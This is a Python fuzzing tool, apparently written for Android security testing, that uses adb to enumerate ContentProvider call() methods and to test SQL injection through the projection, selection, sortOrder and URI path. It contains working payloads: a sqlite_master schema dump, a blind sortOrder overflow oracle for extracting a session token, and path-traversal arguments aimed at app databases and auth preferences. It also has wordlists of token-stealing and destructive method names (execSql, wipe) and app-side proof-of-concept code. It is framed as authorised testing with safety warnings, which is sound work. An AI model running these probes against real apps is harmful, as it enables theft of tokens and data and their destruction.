#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# provider-call-fuzz.py — fuzz a ContentProvider's call() RPC surface AND all four
#                         of its query-side injection points.
#
# WHAT IT DOES
#   Two things Drozer does not do, driven through `adb shell content`:
#
#     1. call() enumeration and fuzzing.  ContentProvider.call() is a generic RPC
#        entry point that receives NO automatic permission check and appears
#        NOWHERE in the manifest. There is no way to discover its method names
#        except to read the code or to guess. This tool guesses, using the
#        return-value difference (null vs Bundle vs exception) as an oracle, then
#        fuzzes the argument of any method it finds live.
#
#     2. Four-point injection testing.  The README makes the point that scanners
#        (including Drozer's scanner.provider.injection) test only `selection`,
#        so `sortOrder` injection is routinely missed, and the `projection` and
#        URI-PATH channels are under-tested too. This tool sends a unique marker
#        through EACH of the four channels — projection, selection (where),
#        sortOrder, and the URI path itself — and reports which ones reflect the
#        marker into a SQLite error or otherwise change behaviour.
#
#          --projection   ->  SELECT <here> FROM ...      (no bind form exists)
#          --where        ->  ... WHERE <here>            (bindable, but often not)
#          --sort         ->  ... ORDER BY <here>         (no bind form exists)
#          uri path       ->  provider-parsed, often  WHERE _id = <segment>
#
# WHY IT MATTERS
#   * call() is, per the README, "the single most under-tested part of the
#     Android component surface" and produces the chapter's highest-impact single
#     findings (getAuthToken, execSql, setServerUrl). No mainstream tool
#     enumerates it. This one does.
#
#   * sortOrder injection is exploitable with a boolean/error oracle even when
#     nothing is returned to the caller (abs(-9223372036854775808) overflows and
#     throws in SQLite). A tester who only tests `selection` and declares the
#     provider clean has missed a real, extractable data-disclosure primitive.
#
#   * REACHABILITY. This tool drives `adb shell content`, so it runs as uid 2000
#     (`shell`), NOT as an app. Everything it finds is SHELL-REACHABLE and must be
#     reproduced from an unprivileged app before it is a finding. Every result
#     line and the final summary repeat this. See README section 4.2 and
#     labs/lab-04-call-rpc.md. `--emit-poc` prints the app-side confirmation code
#     you still have to run.
#
# HOW TO RUN
#   # enumerate call() methods with the built-in wordlist:
#   python3 provider-call-fuzz.py --authority com.example.app.provider --mode call
#
#   # a custom method wordlist, and fuzz the arg of every live method:
#   python3 provider-call-fuzz.py --authority com.example.app.provider \
#       --mode call --methods ./methods.txt --fuzz-args
#
#   # all four injection points against a specific path:
#   python3 provider-call-fuzz.py --authority com.example.app.provider \
#       --path notes --mode inject
#
#   # everything, against a chosen device:
#   python3 provider-call-fuzz.py --authority com.example.app.provider \
#       --path notes --mode all --serial emulator-5554 --emit-poc
#
# REQUIREMENTS
#   Python 3.6+.  adb on PATH, one device/emulator connected.  No root.
#   No device-side installation. Uses only the stock `content` command.
#
# SAFETY
#   Default mode is READ-ONLY. It never calls insert/update/delete and never
#   sends a call() method that mutates unless you pass --dangerous-methods, which
#   adds names like "wipe"/"reset"/"execSql" to the wordlist. Fuzzing a method
#   whose NAME you do not understand can still have side effects (a live
#   "clearCache" clears the cache). Read the method list before you run it, and
#   never run this against production data that is not in scope.
#
#   call() can also START THE TARGET PROCESS as a side effect (resolving the
#   authority forks the owning app). That alone is usually harmless but is not
#   nothing on a device you were told not to disturb.
#
# AUTHORISED TESTING ONLY.

import argparse
import subprocess
import sys
import time
import uuid

# --------------------------------------------------------------------------- #
#  Wordlists
# --------------------------------------------------------------------------- #

# Method names seen in real providers, grouped so the output is readable and so a
# reader can reason about the blast radius before running --fuzz-args.
CALL_METHODS_SAFE = [
    # read / getter shapes — the high-value, low-risk names to try first
    "getAuthToken", "getToken", "getAccessToken", "getRefreshToken",
    "getUploadToken", "getApiKey", "getSecret", "getCredentials",
    "getConfig", "getPublicConfig", "getSettings", "getServerUrl",
    "getState", "dumpState", "getStatus", "getVersion", "getSchemaVersion",
    "getUser", "getAccount", "getSession", "getDeviceId", "getInfo",
    "getAll", "list", "query", "read", "fetch", "sync", "refresh",
    "isLoggedIn", "isEnabled", "isDebug", "ping", "hello", "test",
    "getUploadUrl", "getDownloadUrl", "getFeatureFlags", "whoami",
]

CALL_METHODS_DANGEROUS = [
    # names that MUTATE. Only added with --dangerous-methods. Read this list.
    "setServerUrl", "setConfig", "setDebug", "enableDebug", "setFlag",
    "setState", "login", "logout", "authenticate", "execSql", "exec",
    "runSql", "rawQuery", "wipe", "clear", "reset", "deleteAll",
    "clearCache", "purge", "resetPassword", "setToken", "importData",
]

# Argument payloads used by --fuzz-args against a live method.
CALL_ARG_PAYLOADS = [
    ("empty",            ""),
    ("marker",           "PROVFUZZ_ARG"),
    ("sql-comment",      "x'--"),
    ("path-traversal",   "../../databases/app.db"),
    ("abs-path",         "/data/data/PACKAGE/shared_prefs/auth.xml"),
    ("url",              "https://provfuzz.invalid/collect"),
    ("sql-select",       "SELECT * FROM sqlite_master"),
    ("json",             '{"k":"v"}'),
    ("long",             "A" * 4096),
    ("format",           "%s%s%s%n"),
]

# --------------------------------------------------------------------------- #
#  Injection payloads for the four query channels
# --------------------------------------------------------------------------- #
#
# Each marker is unique so we can tell WHICH channel reflected it if several error
# messages come back at once. The "probe" payload is a bare marker whose job is
# only to be reflected into "no such column: <marker>". The "exploit" payloads
# demonstrate the channel is truly a raw-SQL sink, not just reflected text.

def injection_probes(marker):
    return {
        # projection: SELECT <here> FROM t. A bare column name that does not exist
        # yields "no such column: <marker>", proving the projection is raw SQL.
        "projection": {
            "flag": "--projection",
            "probe": marker,
            "exploit": "(SELECT group_concat(name) FROM sqlite_master) AS leak",
            "note": "column position — NO bind form exists; a schema dump lands here directly",
        },
        # selection: WHERE <here>. Bindable in principle, but only if the provider
        # used selectionArgs. A tautology that changes the row count proves the
        # clause is honoured; a syntax error with the marker proves concatenation.
        "selection": {
            "flag": "--where",
            "probe": marker + "=1",
            "exploit": "1=1",
            "note": "WHERE position — the one channel scanners DO test",
        },
        # sortOrder: ORDER BY <here>. No bind form. The overflow oracle turns it
        # into a one-bit output channel even with no reflected output at all.
        "sortOrder": {
            "flag": "--sort",
            "probe": marker,
            "exploit": "CASE WHEN (SELECT count(*) FROM sqlite_master)>0 "
                       "THEN 1 ELSE abs(-9223372036854775808) END",
            "note": "ORDER BY position — NO bind form; the channel scanners MISS",
        },
    }

# --------------------------------------------------------------------------- #
#  adb plumbing
# --------------------------------------------------------------------------- #

class Adb:
    def __init__(self, serial=None, timeout=25, verbose=False):
        self.base = ["adb"]
        if serial:
            self.base += ["-s", serial]
        self.timeout = timeout
        self.verbose = verbose

    def check_device(self):
        try:
            out = subprocess.run(self.base + ["get-state"],
                                 capture_output=True, text=True, timeout=10)
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            sys.exit("error: adb not usable: %s" % e)
        if "device" not in out.stdout:
            sys.exit("error: no device in 'device' state (adb get-state: %r)"
                     % out.stdout.strip())

    def shell(self, cmd):
        """Run a shell command, return combined stdout+stderr, CRLF-stripped."""
        if self.verbose:
            sys.stderr.write("    $ adb shell %s\n" % cmd)
        try:
            r = subprocess.run(self.base + ["shell", cmd],
                               capture_output=True, text=True, timeout=self.timeout)
        except subprocess.TimeoutExpired:
            return "__TIMEOUT__"
        return (r.stdout + r.stderr).replace("\r", "")

# --------------------------------------------------------------------------- #
#  Response classification (the README 7.3 oracle)
# --------------------------------------------------------------------------- #

def classify(out):
    low = out.lower()
    if out == "__TIMEOUT__":
        return "TIMEOUT", "no response in time — possible DoS or a blocking call()"
    if "not exported from" in low:
        return "NOT-EXPORTED", "provider exists, unreachable cross-uid"
    if "permission denial" in low:
        return "PERM-DENIED", "reachable but guarded — note the permission name"
    if "unknown uri" in low or "unsupported uri" in low:
        return "PAST-CHECK", "provider code ran, PATH wrong only — you are past the permission check"
    if "unable to resolve content provider" in low or "could not find provider" in low:
        return "NO-AUTHORITY", "wrong authority or hidden by package visibility"
    if "no such column" in low or "no such table" in low or "syntax error" in low \
            or "sqliteexception" in low:
        return "SQL-LEAK", "raw SQLite error surfaced — injection candidate"
    if "illegalargumentexception" in low and "method" in low:
        return "CALL-UNKNOWN", "call() threw on this method name — not implemented (good oracle)"
    if "result: null" in low or low.strip() == "":
        return "NULL", "null/empty — for call() often means method not handled"
    if "bundle" in low or "result:" in low:
        return "CALL-BUNDLE", "call() returned a Bundle — METHOD IS LIVE"
    if "row:" in low:
        return "DATA", "rows returned to uid 2000 — confirm from an app"
    if "exception" in low:
        return "EXCEPTION", "read it by hand"
    return "OTHER", "unclassified — read raw output"


REACH_TAGS = {"DATA", "CALL-BUNDLE", "SQL-LEAK", "PAST-CHECK"}

# --------------------------------------------------------------------------- #
#  Banners — the reachability discipline, printed where it cannot be missed
# --------------------------------------------------------------------------- #

BANNER_TOP = r"""
###############################################################################
# provider-call-fuzz.py  —  runs as uid 2000 (adb shell), NOT as an app.
#
#   SHELL-REACHABLE  = uid 2000 got a response. NOT proof an attacker app can.
#   Reproduce every interesting line from an unprivileged app (Drozer agent or a
#   sideloaded probe APK) before it is a finding. Pass --emit-poc for the code.
#
#   query() and openFile() take different permission paths; call() gets NO
#   automatic permission check at all. Test each independently.
###############################################################################
"""

BANNER_BOTTOM = r"""
###############################################################################
# NEXT STEP — make it a finding
#   1. From an unprivileged app with a <queries> entry for the target:
#        Bundle b = getContentResolver().call(uri, "<method>", "<arg>", null);
#        Cursor c = getContentResolver().query(uri, new String[]{"<payload>"},
#                                               null, null, null);
#   2. Record the app result beside the shell result. Different claims,
#      different severities. See labs/lab-04-call-rpc.md.
###############################################################################
"""

# --------------------------------------------------------------------------- #
#  Modes
# --------------------------------------------------------------------------- #

def quote(s):
    """Wrap a payload so the device shell sees it as one argument."""
    return "'" + s.replace("'", "'\\''") + "'"


def run_call_mode(adb, authority, methods, fuzz_args, results):
    uri = "content://%s" % authority
    print("\n== call() ENUMERATION against %s" % uri)
    print("   call() gets NO automatic permission check and is invisible in the")
    print("   manifest. If the provider is exported with no permission, this")
    print("   whole surface is open. See README section 5.5.\n")
    print("   %-22s %-14s %s" % ("METHOD", "CLASS", "MEANING"))
    print("   " + "-" * 92)

    live = []
    for m in methods:
        cmd = "content call --uri %s --method %s" % (quote(uri), quote(m))
        out = adb.shell(cmd)
        tag, meaning = classify(out)
        results.append((("call", m), tag))
        marker = " <<<" if tag in REACH_TAGS else ""
        print("   %-22s %-14s %s%s" % (m, tag, meaning, marker))
        if tag in REACH_TAGS:
            live.append(m)
            for ln in out.strip().splitlines()[:4]:
                print("       | " + ln)
        time.sleep(0.02)

    if not live:
        print("\n   No method returned a Bundle or an interesting error.")
        print("   That is NOT proof call() is safe: many providers return null for")
        print("   unknown methods, so a live method you did not guess looks the same")
        print("   as no method. Read the switch statement in JADX:")
        print("     jadx -d out/ target.apk && grep -rn -A40 'public Bundle call' out/sources/")
        return

    print("\n   LIVE call() methods (shell-reachable): %s" % ", ".join(live))

    if fuzz_args:
        print("\n== call() ARGUMENT FUZZING of live methods")
        print("   WARNING: sending payloads to a method whose behaviour you have not")
        print("   read can have side effects. Ctrl-C now if unsure.\n")
        for m in live:
            print("   method: %s" % m)
            for label, payload in CALL_ARG_PAYLOADS:
                cmd = "content call --uri %s --method %s --arg %s" % (
                    quote(uri), quote(m), quote(payload))
                out = adb.shell(cmd)
                tag, _ = classify(out)
                snippet = out.strip().replace("\n", " ")[:70]
                print("     %-14s -> %-12s %s" % (label, tag, snippet))
                time.sleep(0.02)


def run_inject_mode(adb, authority, path, results):
    if path:
        uri = "content://%s/%s" % (authority, path.lstrip("/"))
    else:
        uri = "content://%s" % authority

    print("\n== FOUR-POINT INJECTION against %s" % uri)
    print("   projection / selection / sortOrder / uri-path. Scanners test only")
    print("   selection; the other three are the point of this mode.\n")

    marker = "PF" + uuid.uuid4().hex[:8].upper()
    probes = injection_probes(marker)

    # 1-3: the three query() string channels.
    for channel, spec in probes.items():
        print("   -- %s  (%s)" % (channel, spec["note"]))

        # (a) reflect a bare marker and look for it in a SQLite error.
        cmd = "content query --uri %s %s %s" % (
            quote(uri), spec["flag"], quote(spec["probe"]))
        out = adb.shell(cmd)
        tag, meaning = classify(out)
        reflected = marker in out
        print("      probe   [%s] reflected=%s  %s" % (tag, reflected, meaning))
        if reflected or tag == "SQL-LEAK":
            for ln in out.strip().splitlines()[:3]:
                print("        | " + ln)
            results.append((("inject:" + channel, "probe"), "INJECTABLE"))
        else:
            results.append((("inject:" + channel, "probe"), tag))

        # (b) fire the channel-appropriate exploit payload.
        cmd = "content query --uri %s %s %s" % (
            quote(uri), spec["flag"], quote(spec["exploit"]))
        out = adb.shell(cmd)
        tag, meaning = classify(out)
        print("      exploit [%s] %s" % (tag, meaning))
        if tag in ("DATA", "SQL-LEAK"):
            for ln in out.strip().splitlines()[:4]:
                print("        | " + ln)
        print()

    # 4: the URI path channel.
    print("   -- uri-path  (provider-parsed; often WHERE _id = <segment>)")
    path_marker = "content://%s/%s" % (authority, marker)
    out = adb.shell("content query --uri %s" % quote(path_marker))
    tag, meaning = classify(out)
    reflected = marker in out
    print("      probe   [%s] reflected=%s  %s" % (tag, reflected, meaning))
    for ln in out.strip().splitlines()[:3]:
        print("        | " + ln)
    # A single-quote in a path segment that surfaces a SQL error means the segment
    # is concatenated into SQL (classic  ...WHERE _id = <seg>  with no binding).
    quote_probe = "content://%s/%s" % (authority, "1'")
    out = adb.shell("content query --uri %s" % quote(quote_probe))
    tag, meaning = classify(out)
    print("      quote   [%s] %s" % (tag, meaning))
    if tag == "SQL-LEAK":
        results.append((("inject:uri-path", "quote"), "INJECTABLE"))
        for ln in out.strip().splitlines()[:3]:
            print("        | " + ln)
    else:
        results.append((("inject:uri-path", "quote"), tag))

    print("\n   sortOrder note: if only --sort is injectable, extract blind with the")
    print("   overflow oracle, e.g.:")
    print("     content query --uri %s \\" % uri)
    print("       --sort \"CASE WHEN (SELECT substr(token,1,1) FROM session)='e'")
    print("               THEN _id ELSE abs(-9223372036854775808) END\"")
    print("   Query SUCCESS = guess right, ERROR = guess wrong. One bit per request.")


def emit_poc(authority, path):
    uri = "content://%s" % authority + (("/" + path.lstrip("/")) if path else "")
    print(r"""
== APP-SIDE CONFIRMATION (paste into a no-permission probe app) ==

// AndroidManifest.xml needs, for Android 11+:
//   <queries><package android:name="TARGET.PACKAGE" /></queries>

Uri uri = Uri.parse("%s");

// 1. call() — no automatic permission check; the highest-impact confirmation
try {
    Bundle b = getContentResolver().call(uri, "REPLACE_WITH_LIVE_METHOD", null, null);
    Log.i("poc", "call -> " + (b == null ? "null" : b.toString()));
} catch (SecurityException e) { Log.i("poc", "call DENIED: " + e.getMessage()); }

// 2. projection injection — a DIRECT read, values come straight back
try (Cursor c = getContentResolver().query(uri,
        new String[]{"(SELECT group_concat(name) FROM sqlite_master) AS leak"},
        null, null, null)) {
    if (c != null && c.moveToFirst()) Log.i("poc", "tables=" + c.getString(0));
} catch (SecurityException e) { Log.i("poc", "query DENIED: " + e.getMessage()); }

// 3. openInputStream — SEPARATE permission path from query(); test it too
try (InputStream in = getContentResolver().openInputStream(uri)) {
    Log.i("poc", "openInputStream -> READABLE");
} catch (SecurityException e) { Log.i("poc", "open DENIED: " + e.getMessage()); }
  catch (Exception e) { Log.i("poc", "open -> " + e.getClass().getSimpleName()); }
""" % uri)


# --------------------------------------------------------------------------- #
#  main
# --------------------------------------------------------------------------- #

def load_wordlist(path):
    items = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                items.append(line)
    return items


def main():
    ap = argparse.ArgumentParser(
        description="Fuzz a ContentProvider's call() surface and all four "
                    "injection points via `adb shell content`.")
    ap.add_argument("--authority", required=True,
                    help="provider authority, e.g. com.example.app.provider")
    ap.add_argument("--path", default="",
                    help="a known path under the authority (for --mode inject)")
    ap.add_argument("--mode", choices=["call", "inject", "all"], default="all",
                    help="what to fuzz (default: all)")
    ap.add_argument("--methods", help="file of call() method names (one per line)")
    ap.add_argument("--fuzz-args", action="store_true",
                    help="fuzz the arg of every live call() method")
    ap.add_argument("--dangerous-methods", action="store_true",
                    help="ALSO try mutating method names (wipe/execSql/...). Read the list first.")
    ap.add_argument("--emit-poc", action="store_true",
                    help="print the app-side confirmation code and exit-append it")
    ap.add_argument("--serial", help="adb device serial (adb -s)")
    ap.add_argument("--timeout", type=int, default=25, help="per-command timeout (s)")
    ap.add_argument("--verbose", action="store_true", help="echo each adb command")
    args = ap.parse_args()

    print(BANNER_TOP)

    adb = Adb(serial=args.serial, timeout=args.timeout, verbose=args.verbose)
    adb.check_device()

    print("   authority : content://%s" % args.authority)
    print("   device    : %s" % (args.serial or "(default)"))
    print("   mode      : %s" % args.mode)

    # Build the call() method list.
    if args.methods:
        methods = load_wordlist(args.methods)
        print("   methods   : %d from %s" % (len(methods), args.methods))
    else:
        methods = list(CALL_METHODS_SAFE)
        if args.dangerous_methods:
            methods += CALL_METHODS_DANGEROUS
            print("   methods   : %d built-in (INCLUDING mutating names)" % len(methods))
        else:
            print("   methods   : %d built-in (read-only shapes; "
                  "--dangerous-methods adds mutating ones)" % len(methods))

    results = []
    try:
        if args.mode in ("call", "all"):
            run_call_mode(adb, args.authority, methods, args.fuzz_args, results)
        if args.mode in ("inject", "all"):
            run_inject_mode(adb, args.authority, args.path, results)
    except KeyboardInterrupt:
        print("\n[interrupted]")

    # Summary.
    print("\n== SUMMARY (shell-reachable — NOT yet findings)")
    interesting = [(k, t) for (k, t) in results
                   if t in REACH_TAGS or t == "INJECTABLE"]
    if interesting:
        for (kind, name), tag in interesting:
            print("   [%s] %-14s %s" % (tag, kind, name))
    else:
        print("   Nothing shell-reachable surfaced. Do not conclude 'safe': read")
        print("   call()'s switch in JADX, and mine real paths before re-probing.")

    if args.emit_poc:
        emit_poc(args.authority, args.path)

    print(BANNER_BOTTOM)


if __name__ == "__main__":
    main()
